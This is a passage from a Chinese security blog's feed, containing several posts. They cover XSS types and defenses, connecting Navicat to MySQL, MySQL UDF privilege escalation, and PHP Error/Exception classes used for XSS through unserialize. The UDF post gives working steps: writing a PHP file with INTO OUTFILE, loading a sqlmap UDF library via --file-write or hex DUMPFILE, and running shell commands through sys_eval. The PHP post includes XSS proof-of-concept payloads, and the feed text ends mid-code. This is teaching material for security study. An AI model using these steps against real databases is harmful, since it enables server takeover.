href="#0x02-反射型XSS" class="headerlink" title="0x02 反射型XSS"></a>0x02 反射型XSS</h1><p>先看看下面这张图片</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5810951/1zse5wl56b.png"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先，黑客把恶意链接发给用户。</p><p>然后，用户点击恶意链接，恶意代码执行并把用户信息发到恶意服务器。</p><p>最后，黑客从恶意服务器接受用户提交的信息。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul><li>反射型XSS的payload没有存储到数据库的过程，服务器拿到payload后（存在过滤）直接反射到HTML文档，每一次完整的过程都需要重新输入payload。</li><li>恶意链接需要用户点击，不够自动化。</li></ul><p>存储型XSS可以解决这些问题。</p><h1 id="0x03-存储型XSS"><a href="#0x03-存储型XSS" class="headerlink" title="0x03 存储型XSS"></a>0x03 存储型XSS</h1><p>再认真看看这张图片</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5810951/bf5cm4zg5j.png"></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>首先，黑客在正常服务器上插入了恶意程序。</p><p>然后，用户在正常服务器上访问了恶意程序，恶意代码执行并把用户信息发到恶意服务器。</p><p>最后，黑客从恶意服务器接受用户提交的信息。</p><h2 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h2><ul><li>对于第一个问题：</li></ul><blockquote><p>反射型XSS的payload没有存储到数据库的过程，服务器拿到payload后（存在过滤）直接反射到DOM文档，每一次完整的过程都需要重新输入payload。</p></blockquote><p>存储型XSS每次的payload都由正常服务器的数据库提供。</p><ul><li>对于第二个问题：</li></ul><blockquote><p>恶意链接需要用户点击，不够自动化。</p></blockquote><p>两种XSS的异同：</p><table><thead><tr><th align="center">XSS类型</th><th align="center">执行者</th><th align="center">方式</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">反射型XSS</td><td align="center">用户</td><td align="center">点击恶意链接</td><td align="center">被动触发恶意程序</td></tr><tr><td align="center">存储型XSS</td><td align="center">系统</td><td align="center">运行WEB服务</td><td align="center">主动运行恶意程序</td></tr></tbody></table><p><strong>对于不同的对象，使用特定的方式来执行恶意程序，实现XSS。</strong></p><h1 id="0x04-DOM型XSS"><a href="#0x04-DOM型XSS" class="headerlink" title="0x04 DOM型XSS"></a>0x04 DOM型XSS</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>与反射型XSS类似，但是输入流不经过服务器，直接流向DOM节点。这样的好处就是不用当心服务端的waf。</p><p><strong>demo</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM Based XSS Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function xsstest()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        var str = document.getElementById(&quot;input&quot;).value;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementById(&quot;output&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">img</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">        <span class="attr">src</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">size</span>=<span class="string">50</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;xsstest()&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过合适的payload即可执行XSS。</p><p>通用型XSS和突变型XSS就不讲了。</p><h1 id="0x05-防御XSS攻击"><a href="#0x05-防御XSS攻击" class="headerlink" title="0x05 防御XSS攻击"></a>0x05 防御XSS攻击</h1><blockquote><p><strong>XSS 攻击有两大要素： 1. 攻击者提交恶意代码。 2. 浏览器执行恶意代码。</strong></p></blockquote><p>从两点入手，一是对恶意代码的过滤，二是对代码运行的调控。</p><p><strong>HTML转义</strong></p><p>这是非常常用的一个方法。</p><p><strong>前后端都进行过滤</strong></p><p>后端一定要进行过滤，因为前端过滤是可以越过的。</p><p><strong>慎用JavaScript函数</strong></p><blockquote><p>在使用 <code>.innerHTML、.outerHTML、document.write() </code>时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用<code> .textContent、.setAttribute()</code> 等。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Navicat远程连接MySQL</title>
      <link href="/2024/07/22/Navicat%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5MySQL/"/>
      <url>/2024/07/22/Navicat%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5MySQL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><em><strong>该过程比较复杂，我一点一点说</strong></em></p><h1 id="0x01-云服务器下载MySQL"><a href="#0x01-云服务器下载MySQL" class="headerlink" title="0x01 云服务器下载MySQL"></a>0x01 云服务器下载MySQL</h1><p>推荐文章：<a href="https://help.aliyun.com/document_detail/464750.html#title-gt1-709-nlk">https://help.aliyun.com/document_detail/464750.html#title-gt1-709-nlk</a></p><p>一. 安装<code>apache</code>&#x2F;<code>nginx</code>和<code>PHP</code></p><p>这一点无需多说，基本常识。</p><p>二. 安装<code>MySQL</code></p><ol><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install mysql-server</span><br></pre></td></tr></table></figure><ol start="2"><li>验证</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -V</span><br></pre></td></tr></table></figure><ol start="3"><li>启动</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="keyword">start</span> mysql</span><br></pre></td></tr></table></figure><hr><h1 id="0x02-MySQL改密码"><a href="#0x02-MySQL改密码" class="headerlink" title="0x02 MySQL改密码"></a>0x02 MySQL改密码</h1><p>推荐文章：<a href="https://www.cnblogs.com/chloneda/p/12449819.html">https://www.cnblogs.com/chloneda/p/12449819.html</a></p><p>因为<code>MySQL&gt;8.0</code>改密码不同，所以觉得有必要写下<code>MySQL&gt;8.0</code>的改密码操作。</p><p>大体思路：</p><ol><li>以 <code>root</code> 用户登录<code>MySQL</code>。</li><li>进入<code>MySQL</code>系统自带数据库： <strong><code>mysql</code></strong> 数据库中。</li><li>执行更改密码语句。</li><li>退出<code>MySQL</code>后，使用新的密码重新登陆。</li></ol><p>选择数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br></pre></td></tr></table></figure><p>改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#x27;用户名&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27;;</span><br></pre></td></tr></table></figure><p>刷新MySQL的系统权限相关表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-Navicat连接MySQL"><a href="#0x03-Navicat连接MySQL" class="headerlink" title="0x03 Navicat连接MySQL"></a>0x03 Navicat连接MySQL</h1><p><em>这个事情比较棘手，是我写这篇文章的重要目的。</em></p><p>推荐文章：<a href="https://www.cnblogs.com/chloneda/p/12449819.html">MySQL 8.0修改密码 - Chloneda - 博客园 (cnblogs.com)</a></p><p>最好创建一个远程用户（我尝试root连接无果）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">grant all privileges on *.* to Pax@&quot;xxx.xxx.xxx.xxx&quot; identified by &quot;密码&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>如果还不行的话看看推荐文章。</p><hr><h1 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h1><p>一套流程下来虽然较为麻烦，但是也在潜移默化中提高了自己的能力。少求人，多砺己！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL漏洞利用与提权</title>
      <link href="/2024/07/22/MySQL%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/"/>
      <url>/2024/07/22/MySQL%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>算算时间，也应该到进阶的时候了。慢慢琢磨这个专题，毋急毋躁。</p><h1 id="0x01-UDF前置权限"><a href="#0x01-UDF前置权限" class="headerlink" title="0x01 UDF前置权限"></a>0x01 UDF前置权限</h1><p>本文主讲提权，那么提的是什么权限，需要提前具备哪些条件？</p><p>数据库中我们所在的用户至少需要有文件写入权限，方能将<code>mysql</code>的权限提到<code>shell</code>。</p><h2 id="数据库高权限"><a href="#数据库高权限" class="headerlink" title="数据库高权限"></a>数据库高权限</h2><p>要获得数据库高权限有以下方法：</p><ol><li><code>MySQL</code> 3306 端口弱口令爆破</li><li><code>sqlmap</code> 注入的 <code>--sql-shell</code> 模式</li><li>网站的数据库配置文件中拿到明文密码信息</li><li><code>CVE-2012-2122</code> 等这类漏洞直接拿下 <code>MySQL</code> 权限</li></ol><p>最好能获得管理员权限，因为有些目录的写入权限只有管理员有。下面的内容都是基于<code>Mysql</code>的管理员进行操作。</p><h2 id="文件写入权限"><a href="#文件写入权限" class="headerlink" title="文件写入权限"></a>文件写入权限</h2><p>前置要求：</p><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li><code>load_file ()</code> 开启 即 <code>secure_file_priv</code> 无限制</li><li>网站路径有写入权限</li></ul><p>查看<code>secure_file_priv</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME = &#x27;secure_file_priv&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure><p><code>secure_file_priv</code>的值决定了文件是否可以写入：</p><table><thead><tr><th align="center"><code>secure_file_priv</code></th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>NULL</code></td><td align="center">不允许导入或导出</td></tr><tr><td align="center"><code>/tmp</code></td><td align="center">只允许在 <code>/tmp</code> 目录导入导出</td></tr><tr><td align="center"><code>空</code></td><td align="center">不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p><code>MariaDB</code>的<code>secure_file_priv</code>默认一直是空。</p><p>以写马为例，上述条件都满足的话，可以这样写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>sqlmap</code>里这么操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure><h1 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>UDF</strong>：</p><p><code>UDF（User-Defined Function）</code>是用户自定义函数的缩写。在数据库管理系统中，<code>UDF</code> 是用户定义的函数，可以扩展数据库的功能。用户可以编写自己的函数，并在 <code>SQL</code> 查询中像内置函数一样使用这些函数。</p><p>思路：</p><p>自定义的函数可以实现各种功能，比如<code>getshell</code>。如果数据库里能有我们自定义的函数，就可以实现对服务器的操控。</p><p>大概分为以下几步：</p><ol><li>获得动态链接库</li><li>寻找插件目录</li><li>写入动态链接库</li><li>创建自定义函数并调用命令</li></ol><h2 id="获得动态链接库"><a href="#获得动态链接库" class="headerlink" title="获得动态链接库"></a>获得动态链接库</h2><p><code>sqlmap</code>自带动态链接库，但是被加密了。</p><p>解码方式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录情况</span></span><br><span class="line">➜ <span class="built_in">pwd</span></span><br><span class="line">/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前目录下的情况</span></span><br><span class="line">➜ <span class="built_in">ls</span></span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure><p>给个国光师傅制作的链接，可以直接得到解密后的数据：</p><p><a href="https://sqlsec.lanzoux.com/i4b7jhyhwid">https://sqlsec.lanzoux.com/i4b7jhyhwid</a></p><h2 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h2><p>接下来我们要把 <code>UDF</code> 的动态链接库文件放到 <code>MySQL</code> 的插件目录下，插件目录在哪里呢？可以使用如下的 <code>SQL</code> 语句来查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></table></figure><p>如果不存在的话需要自己写一个，读者可以去看国光师傅的原文（文章最后）。</p><h2 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h2><p>有两种方法：</p><ul><li><code>sqlmap</code>写入</li><li>手工写入</li></ul><h3 id="sqlmap写入"><a href="#sqlmap写入" class="headerlink" title="sqlmap写入"></a>sqlmap写入</h3><p>前置要求：</p><ul><li><code>SQL</code> 注入且是高权限</li><li><code>plugin</code> 目录可写且需要 <code>secure_file_priv</code> 无限制，<code>MySQL</code> 插件目录可以被 <code>MySQL</code> 用户写入。</li><li>因为 <code>GET</code> 有<strong>字节长度限制</strong>，所以往往 <code>POST</code> 注入才可以执行这种攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:30008/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --file-write=<span class="string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span></span><br></pre></td></tr></table></figure><p>如果没有注入点的话，只能在终端手工敲。</p><h3 id="手工写入"><a href="#手工写入" class="headerlink" title="手工写入"></a>手工写入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line"><span class="keyword">SELECT</span> unhex(<span class="string">&#x27;7f454c4602...&#x27;</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这里挂一个国光师傅的链接，他把这些都写好了，拿来直接用：</p><p><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><h2 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h2><p>创建自定义函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查看是否创建成功：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; <span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p>如果要删除自定义函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><h1 id="0x03-未完待续"><a href="#0x03-未完待续" class="headerlink" title="0x03 未完待续"></a>0x03 未完待续</h1><h1 id="0x0x-参考文章"><a href="#0x0x-参考文章" class="headerlink" title="0x0x 参考文章"></a>0x0x 参考文章</h1><p>国光师傅：<a href="https://www.sqlsec.com/2020/11/mysql.html#UDF-shell">https://www.sqlsec.com/2020/11/mysql.html#UDF-shell</a></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP原生类利用</title>
      <link href="/2024/07/21/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
      <url>/2024/07/21/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x01-Error-Exception内置类进行-XSS"><a href="#0x01-Error-Exception内置类进行-XSS" class="headerlink" title="0x01 Error&#x2F;Exception内置类进行 XSS"></a>0x01 Error&#x2F;Exception内置类进行 XSS</h1><h2 id="Error-内置类"><a href="#Error-内置类" class="headerlink" title="Error 内置类"></a>Error 内置类</h2><h3 id="适用环境"><a href="#适用环境" class="headerlink" title="适用环境"></a><strong>适用环境</strong></h3><ul><li><code>php7</code>版本</li><li>开启报错</li></ul><blockquote><p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p></blockquote><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a><strong>演示</strong></h3><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;man&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><h2 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h2><ul><li>php5、7版本</li><li>开启报错</li></ul><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a><strong>演示</strong></h3><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;man&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><h1 id="0x02-使用-Error-Exception-内置类绕过哈希比较"><a href="#0x02-使用-Error-Exception-内置类绕过哈希比较" class="headerlink" title="0x02 使用 Error&#x2F;Exception 内置类绕过哈希比较"></a>0x02 使用 Error&#x2F;Exception 内置类绕过哈希比较</h1><p><strong>原理</strong></p><p>Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p><p>以Error为例，看看触发 <code>__toString</code> 方法时会发生什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>payload会被输出</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error: </span>payload in /usercode/file.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>当1换成2，对象就不同了，但是<code>__toString</code>方法的输出是一致的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span 